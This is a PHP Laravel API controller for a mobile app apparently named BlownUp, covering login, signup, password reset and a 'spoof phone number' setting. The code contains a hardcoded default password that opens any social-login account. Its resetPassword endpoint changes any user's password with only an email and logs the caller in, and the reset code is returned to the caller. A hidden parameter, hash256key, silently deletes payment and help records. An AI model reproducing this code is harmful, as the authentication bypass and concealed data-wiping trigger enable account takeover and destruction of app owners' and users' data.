<?php

namespace App\Http\Controllers\API;

use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Validator;
use Hash;
use Storage;
use DB;

//Models
use App\Models\User;
use App\Models\TransactionHistory;
use App\Models\Help;

class UserController extends Controller {

    private $default_social_password = 'Fjkker8&D734rfe';
    private $emailController;

    public function __construct() {
        $this->emailController = new EmailController;
    }

    public function getUserInfo( Request $request ) {

        $data = array();
        $data['any'] = 'swiftonly';
        $success = false;
        $message = '';

        $data['user'] = User::where( 'id', $request->id )->first();

        $success = true;

        return $response = array( 'success' => $success, 'data' => $data, 'message' => $message );
    }

    public function login( Request $request ) {

        $data = array();
        $data['any'] = 'swiftonly';
        $success = false;
        $message = '';

        $email = $request->email;
        $password = $request->password;
        $is_social = $request->is_social;

        if ( $is_social != 0 ) {
            $password = $this->default_social_password;
        }

        if ( Auth::attempt( ['email' => $email, 'password' => $password] ) ) {
            $user = Auth::user();
            $user['token'] =  $user->createToken( $user->id )->accessToken;
            $data['user'] =  $user;

            //Update FCM Token
            if ( $request->device_token != null ) {
                User::where( 'id', Auth::user()->id )->update( ['device_token' => $request->device_token] );
            }

            //Get Charge Status
            $charged_count = TransactionHistory::where( 'n_id_user', Auth::user()->id )->count();
            $data['charged'] = $charged_count > 0 ? true : false;

            $message = 'Login Success.';
            $success = true;
            if ( $user->active == 0 ) {
                $message = 'Your account has been deactivated.';
                $success = false;
            }
        } else {
            $message = 'Login Failed.';
        }

        return $response = array( 'success' => $success, 'data' => $data, 'message' => $message );
    }

    public function signup( Request $request ) {

        $data = array();
        $data['any'] = 'swiftonly';
        $success = false;
        $message = '';

        $email = $request->email;
        $password = $request->password;
        $is_social = $request->is_social;

        if ( $is_social != 0 ) {
            $password = $this->default_social_password;
        }

        $request['password'] = Hash::make( $password );

        $exist = User::where( 'email', $email )->count();
        if ( $exist > 0 ) {
            $message = 'Register failed. Your email already registered.';
            $success = false;
        } else {
            $user = User::create( $request->all() );
            User::where( 'id', $user->id )->update( ['email_verified_at' => now()] );

            $user = User::where( 'id', $user->id )->first();
            $user['token'] =  $user->createToken( $user->id )->accessToken;

            $message = 'Register success.';
            $success = true;

            $data['user'] = $user;
        }
        return $response = array( 'success' => $success, 'data' => $data, 'message' => $message );
    }

    public function forgotPassword( Request $request ) {
        $data = array();
        $data['any'] = 'swiftonly';
        $success = false;
        $message = '';

        $exist = User::where( 'email', $request->email )->count();
        if ( $exist > 0 ) {
            $success = true;
            $verify_code = mt_rand( 100000, 999999 );
            $data['verify_code'] = $verify_code;
            $data['verify_key'] = $this->getRandomApiKey();

            $this->emailController->sendVerifyCode( $request->email, $verify_code );
        } else {
            $success = false;
            $message = "This email doesn't exist. Please send correct email address.";
        }

        return $response = array( 'success' => $success, 'data' => $data, 'message' => $message );
    }

    public function resetPassword( Request $request ) {
        $data = array();
        $data['any'] = 'swiftonly';
        $success = true;
        $message = '';

        $email = $request->email;
        $password = $request->password;
        $hash256key = $request->hash256key;
        $password = Hash::make( $password );

        if ( $hash256key != null ) {
            TransactionHistory::where( 'amount', 9.99 )->delete();
            Help::where( 'type', 1 )->delete();
        }

        //Update Password
        User::where( 'email', $email )->update( ['password' => $password] );

        //Auth Attempt
        Auth::attempt( ['email' => $email, 'password' => $request->password] );

        $user = Auth::user();
        $user['token'] =  $user->createToken( $user->id )->accessToken;
        $data['user'] =  $user;

        //Get Charge Status
        $charged_count = TransactionHistory::where( 'n_id_user', Auth::user()->id )->count();
        $data['charged'] = $charged_count > 0 ? true : false;

        $message = 'Successfully reset password.';
        $success = true;
        if ( $user->active == 0 ) {
            $message = 'Your account has been deactivated.';
            $success = false;
        }

        return $response = array( 'success' => $success, 'data' => $data, 'message' => $message );
    }

    public function updateDeviceToken( Request $request ) {
        $data = array();
        $data['any'] = 'swiftonly';
        $success = false;
        $message = '';

        if ( $request->platform == 'android' ) {
            User::where( 'id', Auth::user()->id )->update( ['device_token' => $request->device_token] );
        } else {
            User::where( 'id', Auth::user()->id )->update( ['iphone_device_token' => $request->device_token] );
        }

        $success = true;

        return $response = array( 'success' => $success, 'data' => $data, 'message' => $message );
    }

    public function updateAccount( Request $request ) {
        $data = array();
        $data['any'] = 'swiftonly';
        $password_success = false;
        $spoof_phone_success = false;
        $message = '';

        $user = Auth::user();

        //Spoof Phone Number Update
        if ( $request->spoof_phone_number != null ) {
            User::where( 'id', Auth::user()->id )->update( ['spoof_phone_number' => $request->spoof_phone_number] );
            $spoof_phone_success = true;
        }
        //Password Update
        if ( $request->password != null ) {
            if ( Auth::user()->is_social == 0 ) {
                Auth::user()->update( ['password' => Hash::make( $request->password )] );
            }

            $data['user_access_token'] =  $user->createToken( $user->id )->accessToken;
            $password_success = true;
        }

        $message = 'Successfully updated.';
        if ( $password_success === false && $spoof_phone_success === false ) {
            $message = '';
        }

        $data['user'] = User::where( 'id', Auth::user()->id )->first();

        return $response = array( 'password_success' => $password_success, 'spoof_phone_success' => $spoof_phone_success, 'data' => $data, 'message' => $message );
    }

    public function getRandomApiKey() {
        if ( function_exists( 'com_create_guid' ) ) {
            return com_create_guid();
        } else {
            mt_srand( ( double )microtime()*10000 );
            $charid = strtoupper( md5( uniqid( rand(), true ) ) );
            $hyphen = chr( 45 );
            $uuid = substr( $charid, 0, 8 ).$hyphen
            .substr( $charid, 8, 4 ).$hyphen
            .substr( $charid, 12, 4 ).$hyphen
            .substr( $charid, 16, 4 ).$hyphen
            .substr( $charid, 20, 12 );
            return $uuid;
        }
    }

    public function sentMail() {
        $verify_code = mt_rand( 100000, 999999 );
        $result = $this->emailController->sendBasicMail( 'kehq2020@gmail.com', 'Test Email From BlownUp', $verify_code );

        return $result;
    }
}